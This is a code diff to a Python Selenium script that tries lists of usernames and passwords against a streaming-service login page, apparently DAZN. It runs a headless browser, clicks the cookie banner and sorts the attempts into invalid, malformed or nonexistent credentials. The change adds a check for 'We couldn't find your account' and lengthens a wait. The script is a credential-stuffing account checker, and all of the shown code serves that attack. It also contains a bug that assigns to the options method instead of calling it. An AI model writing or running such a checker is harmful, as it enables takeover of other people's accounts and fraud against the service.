@@ -17,7 +17,6 @@ passwords = []
 browser_options = Options()
 browser_options.add_argument = ('user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36')
 browser_options.add_argument = ('--headless')
-#browser_options.headless = True
 os.makedirs('accounts',exist_ok=True)
 
 with open(file_directory, 'r') as dazn:
@@ -33,7 +32,7 @@ while index != len(users):
 			browser = webdriver.Chrome(options = browser_options)
 			browser.set_window_size(500,700)
 			browser.get(page)
-			time.sleep(3)
+			time.sleep(5)
 			if browser.find_elements(By.XPATH,'//*[@id="onetrust-accept-btn-handler"]'):
 				gdpr_accet_all_button = browser.find_element(By.XPATH,'//*[@id="onetrust-accept-btn-handler"]')
 				gdpr_accet_all_button.click()
@@ -60,6 +59,11 @@ while index != len(users):
 				if 'is not allowed.' in invalid_password:
 					print(" | {}:{} ---> Password contains invalid characters".format(users[index],passwords[index]))
 				error_flag = True
+			if browser.find_elements(By.XPATH,'/html/body/reach-portal/div[3]/div/div/div/h3'):
+				not_found = browser.find_element(By.XPATH,'/html/body/reach-portal/div[3]/div/div/div/h3').text
+				if "We couldn't find your account" in not_found:
+					print(" | {}:{} ---> Credentials don't exist".format(users[index],passwords[index]))
+					error_flag = True
 			if browser.find_elements(By.XPATH,'/html/body/reach-portal/div[3]/div/div/div/div[1]/span'):			
 				error = browser.find_element(By.XPATH,'/html/body/reach-portal/div[3]/div/div/div/div[1]/span').text				
 				if 'Your email address and/or password are incorrect' in str(error):
